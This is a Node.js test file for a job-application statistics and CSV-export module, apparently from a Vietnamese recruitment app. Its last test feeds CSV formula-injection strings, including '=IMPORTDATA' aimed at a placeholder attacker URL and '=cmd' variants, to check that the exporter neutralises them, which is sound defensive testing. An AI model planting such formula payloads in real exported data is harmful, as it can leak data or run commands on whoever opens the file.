import test from 'node:test';
import assert from 'node:assert/strict';
import { buildApplicationStatistics, applicationsCsv, csvCell } from '../src/shared/applicationMatching.ts';

const jobs = [
  { id: 'job-a', title: 'Giáo viên Anh', isHidden: false },
  { id: 'job-b', title: '  Giáo viên   Anh ', isHidden: true },
  { id: 'job-c', title: 'Kế toán' },
  { id: 'job-zero', title: 'Nhân sự' },
];

test('IDs own submissions; duplicate/legacy titles never double-count; hidden and zero jobs remain visible', () => {
  const applications = [
    { id: '1', jobId: 'job-a', jobTitle: 'Kế toán', status: 'new' },
    { id: '2', jobId: 'job-b', jobTitle: 'Giáo viên Anh', status: 'reviewed' },
    { id: '3', jobTitle: '   kế  toán  ', status: 'contacted' },
    { id: '4', jobTitle: 'Giáo viên Anh', status: 'passed' },
    { id: '5', jobId: 'deleted', jobTitle: 'Kế toán', status: 'rejected' },
    { id: '6', jobTitle: 'Khác', status: 'legacy-status' },
    { id: '7', jobId: 'job-a', jobTitle: 'Giáo viên Anh' },
  ];
  const stats = buildApplicationStatistics(jobs, applications);
  assert.deepEqual(stats.rows.map(row => [row.job.id, row.total]), [['job-a', 2], ['job-b', 1], ['job-c', 1], ['job-zero', 0]]);
  assert.equal(stats.byJobId.get('job-b')?.job.isHidden, true);
  assert.deepEqual(stats.unmatched.map(app => app.id), ['4', '5', '6']);
  assert.equal(stats.ambiguousCount, 1);
  assert.equal(stats.rows.reduce((sum, row) => sum + row.total, stats.unmatched.length), applications.length);
  assert.equal(Object.values(stats.statuses).reduce((sum, count) => sum + count, 0), applications.length);
  assert.equal(stats.statuses.new, 2);
  assert.equal(stats.statuses.other, 1);
  assert.equal(stats.match(applications[4]).reason, 'unknown-id');
});

test('canonical Unicode title matching supports legacy Vietnamese data with no ID', () => {
  const title = 'Kế toán';
  const stats = buildApplicationStatistics([{ id: 'finance', title }], [{ id: 'legacy', jobId: ' ', jobTitle: title.normalize('NFD').toUpperCase() }]);
  assert.equal(stats.byJobId.get('finance')?.total, 1);
});

test('CSV neutralizes every candidate-controlled formula cell and uses the same matching result', () => {
  for (const text of ['=1+1', '+SUM(1)', '-1+1', '@SUM(1)', '\t=cmd', '\r=cmd', '  =cmd', '\u0000=cmd']) assert.ok(csvCell(text).startsWith('"\''));
  assert.equal(csvCell('name, "quoted"\nline'), '"name, ""quoted""\nline"');
  const csv = applicationsCsv([
    { id: '1', jobId: 'job-a', jobTitle: 'Kế toán', name: '=IMPORTDATA("https://attacker.invalid")', phone: '+84900000000', notes: '\t=cmd', createdAt: 'test' },
    { id: '2', jobTitle: 'Giáo viên Anh', name: 'Synthetic candidate', createdAt: 'test' },
  ], jobs, () => 'test date');
  assert.ok(csv.startsWith('\uFEFF'));
  assert.match(csv, /"job-a","Đã xác định"/);
  assert.match(csv, /"Giáo viên Anh","","Chưa xác định"/);
  assert.match(csv, /"'=IMPORTDATA/);
  assert.match(csv, /"'\+84900000000"/);
  assert.match(csv, /"'\t=cmd"/);
  assert.doesNotMatch(csv, /api\/uploads/);
});
